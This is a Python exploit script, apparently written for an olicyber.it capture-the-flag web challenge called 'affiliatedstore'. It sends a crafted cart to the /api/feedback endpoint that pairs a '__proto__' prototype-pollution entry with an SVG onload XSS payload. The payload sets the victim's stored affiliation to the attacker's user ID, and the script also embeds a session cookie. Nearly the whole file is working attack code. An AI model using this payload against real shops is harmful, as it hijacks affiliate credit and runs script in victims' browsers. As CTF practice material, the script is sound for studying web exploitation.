import requests
import json

# --- User-configurable values ---
TARGET_BASE_URL = "http://affiliatedstore.challs.olicyber.it"
YOUR_USER_ID = "68301b96a429b6cdbe352317"  # Confirmed from your previous output
YOUR_POW_SOLUTION = "1:26:250523:eba408bb39e316c7::h+8OiLNkyWNGx/pM:NbLyv"  # !!! GET A FRESH POW SOLUTION !!!
YOUR_SESSION_COOKIE_VALUE = "eyJ1c2VyIjoicG9yY28iLCJ1c2VyX2lkIjoiNjgzMDFiOTZhNDI5YjZjZGJlMzUyMzE3In0.aDAkzg.gm9YP2_g1wj75UQVYfCmNIOipv0"  # Replace with your current session cookie

# --- Constructing the NEW malicious cart payload ---
# Using SVG onload for the XSS
malicious_cart_payload = [
    {
        "id": "__proto__",
        "innerHTML": f"<svg onload=\"sessionStorage.setItem('affiliation', '{YOUR_USER_ID}'); console.log('XSS executed via SVG, affiliation set to: {YOUR_USER_ID}');\"></svg>"
    },
    {
        "id": "dummy1",
        "name": "Dummy Product (SVG attempt)"
    },
    {
        "id": "dummy2", # To ensure sl-divider creation after pollution
        "name": "Another Dummy Product"
    }
]

# --- Constructing the feedback request body ---
feedback_request_body = {
    "cart": malicious_cart_payload,
    "pow": YOUR_POW_SOLUTION
}

# --- Setting up the request ---
feedback_url = f"{TARGET_BASE_URL}/api/feedback"
headers = {
    "Content-Type": "application/json",
}
cookies = {
    "session": YOUR_SESSION_COOKIE_VALUE
}
try:
    print(f"Sending POST request to: {feedback_url}")
    print(f"Payload: {json.dumps(feedback_request_body, indent=2)}")

    response = requests.post(
        feedback_url,
        headers=headers,
        cookies=cookies,
        data=json.dumps(feedback_request_body)
    )

    print("\n--- Response ---")
    print(f"Status Code: {response.status_code}")
    print("Headers:")
    for header, value in response.headers.items():
        print(f"  {header}: {value}")
    print("Body:")
    try:
        print(json.dumps(response.json(), indent=2))
    except json.JSONDecodeError:
        print(response.text)

    if response.status_code == 200:
        response_json = response.json()
        if response_json.get("status") == "ok":
            print("\n[SUCCESS] Feedback submitted successfully with new SVG payload.")
            print(f"Check your dashboard at {TARGET_BASE_URL}/dashboard after a few moments for the flag.")
    else:
        print(f"\n[ERROR] Feedback submission failed with status code {response.status_code} (SVG attempt).")
except requests.exceptions.RequestException as e:
    pass